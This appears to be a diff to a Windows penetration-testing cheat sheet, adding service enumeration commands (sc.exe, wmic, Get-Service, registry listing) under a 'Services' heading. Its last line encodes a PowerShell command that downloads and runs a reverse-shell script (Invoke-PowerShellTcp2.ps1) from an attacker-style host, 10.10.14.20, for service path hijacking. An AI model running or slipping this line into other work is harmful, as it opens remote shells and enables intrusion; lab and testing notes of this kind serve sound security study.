@@ -1,8 +1,17 @@
 ==============================================================================
 [+] Services
 ==============================================================================
-# List services
+# List services cmd
 sc.exe query state=all
+wmic service get name,startname
+
+# List services Powershell
+Get-Service
+
+#List Services by regedit Powershell 
+Set-Location 'HKLM:\SYSTEM\CurrentControlSet\Services'
+Get-ChildItem .
+Get-ChildItem | Where-Object { $_.Name -Like '*video*' }
 
 # Change path of services
 echo "IEX (IWR http://10.10.14.20:8000/Invoke-PowerShellTcp2.ps1 -UseBasicParsing)" | iconv -t utf-16le |base64 -w 0
